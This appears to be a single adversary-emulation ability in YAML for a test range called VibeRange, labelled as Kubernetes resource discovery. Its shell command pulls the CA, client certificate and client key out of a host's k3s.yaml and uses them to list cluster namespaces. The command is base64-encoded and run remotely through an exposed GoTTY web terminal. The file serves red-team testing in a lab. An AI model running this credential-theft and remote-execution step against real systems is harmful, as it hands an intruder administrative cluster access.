---
- id: c0a1de4a-701d-4c9a-b541-936ff3871011
  name: VibeRange prove non-destructive k3s cluster administration
  description: Use host k3s client certificates to list namespace names without retrieving secret contents.
  tactic: discovery
  technique:
    attack_id: T1613
    name: Container and Resource Discovery
  platforms:
    linux:
      sh:
        command: >-
          command_b64=$(printf '%s' 'set -eu; cfg=#{viberange.target.host_mount}/etc/rancher/k3s/k3s.yaml; prefix=/tmp/viberange-k3s-#{viberange.run.id}; grep certificate-authority-data: "$cfg" | head -1 | cut -d: -f2- | tr -d " " | base64 -d >"${prefix}.ca"; grep client-certificate-data: "$cfg" | head -1 | cut -d: -f2- | tr -d " " | base64 -d >"${prefix}.cert"; grep client-key-data: "$cfg" | head -1 | cut -d: -f2- | tr -d " " | base64 -d >"${prefix}.key"; code=$(curl -sS --cacert "${prefix}.ca" --cert "${prefix}.cert" --key "${prefix}.key" -o "${prefix}.namespaces" -w "%{http_code}" "#{viberange.target.kubernetes_api}/api/v1/namespaces"); printf "VIBERANGE_CLUSTER_API_STATUS=%s\\n" "$code"; grep -o "name[^,]*" "${prefix}.namespaces" | head -20; rm -f "${prefix}.ca" "${prefix}.cert" "${prefix}.key" "${prefix}.namespaces"; test "$code" = 200; printf "VIBERANGE_CLUSTER_ADMIN=%s\\n" "#{viberange.run.id}"' | base64 -w0); /usr/local/bin/viberange-gotty-exec --url "http://#{viberange.target.ip}:#{viberange.target.system_monitor_port}" --command-b64 "$command_b64"
        timeout: 90
